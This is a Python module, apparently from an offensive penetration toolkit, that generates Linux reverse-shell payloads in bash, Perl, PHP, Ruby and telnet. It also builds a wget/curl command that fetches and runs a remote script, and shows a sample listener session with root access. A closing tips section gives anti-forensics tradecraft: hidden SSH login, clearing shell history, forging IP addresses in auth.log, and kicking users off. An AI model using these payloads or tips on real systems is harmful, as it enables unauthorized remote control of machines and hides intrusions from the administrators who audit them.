# encoding: utf8
from base64 import b64encode
from config import *


class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Linux Reverse Shell',
            'Author': 'nul1',
            'Update': '2018/9/15',
        }

        self.desc_reverse = """
Bash Reverse Shell
"""

        self.desc_exec_reverse = """
exec命令可以用来替代当前shell,也就是说并没有启动子shell，使用这一条命令时任何现有环境变量将会被清除，并重新启动一个shell
zsh不成功
"""

        self.desc_back = """
利用wget或curl从远程服务器下载反弹shell脚本，并执行\n
root@God /var/www # ncat -lvp 88       
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::88
Ncat: Listening on 0.0.0.0:88
Ncat: Connection from 1.1.1.1.
Ncat: Connection from 1.1.1.1:49301.
sh-3.2$ whoami
root
"""

        self.desc_telnet = """
$ telnet 10.10.10.2 8181 | /bin/bash | telnet 10.10.10.2 8888
/bin/bash: line 1: Trying: command not found
/bin/bash: line 2: Connected: command not found
/bin/bash: line 3: Escape: command not found
Trying 10.10.10.2...
Connected to 10.10.10.2.
Escape character is '^]'.

远程服务器监听
ncat -lvp 8181   //输入命令
ncat -lvp 8888   //接受命令

"""

    def bash_reverse(self, ip=LHOST, port=LPORT):
        bash = "bash -i >& /dev/tcp/{0}/{1} 0>&1".format(ip, port)
        java = "bash -c {echo," + b64encode(bash.encode('utf-8')).decode('utf-8') + "}|{base64,-d}|{bash,-i}"
        return bash + "\n" + java

    def exec_reverse(self, ip=LHOST, port=LPORT):
        return "exec 5<>/dev/tcp/{0}/{1} && cat <&5 | while read line; do $line 2>&5 >&5; done".format(ip, port)

    def perl_reverse(self, ip=LHOST, port=LPORT):
        # 注意对{}的过滤，测试ok
        return "perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(
            ip, port)

    def telnet_reverse(self):
        return "telnet 10.10.10.2 8181 | /bin/bash | telnet 10.10.10.2 8888"

    def php_reverse(self, ip=LHOST, port=LPORT):
        return "php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port)

    def ruby_reverse(self, ip=LHOST, port=LPORT):
        return "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{0}\",\"{1}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'".format(
            ip, port)

    def wget_reverse(self, ip=LHOST, port=LPORT):
        return "wget http://{0}/back.py -P /tmp/;python /tmp/back.py {0} {1}\n\ncurl http://{0}/back2.py | python -".format(
            ip, port)

    def linux_tips(self):
        return """
1. 隐蔽登录
    ssh -T root@ip /bin/bash -i
    
2. 清理历史
    export HISTSIZE=0

3. 简单的伪造日志
    sudo sed -i 's/52.141.19.105/47.244.12.12/' /var/log/auth.log
    
4. 查看计划任务
    crontab -l;ls -alh /var/spool/cron;ls -al /etc/cron*;cat /etc/cron*

5. 数据包嗅探
    tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
    
6. 查看进程所打开的文件
    lsof -p pid

7. 查看某个端口对应的程序
    lsof -nP -i :port
    
8. 踢人
    w
    pkill -9 -t pts/1
        
"""
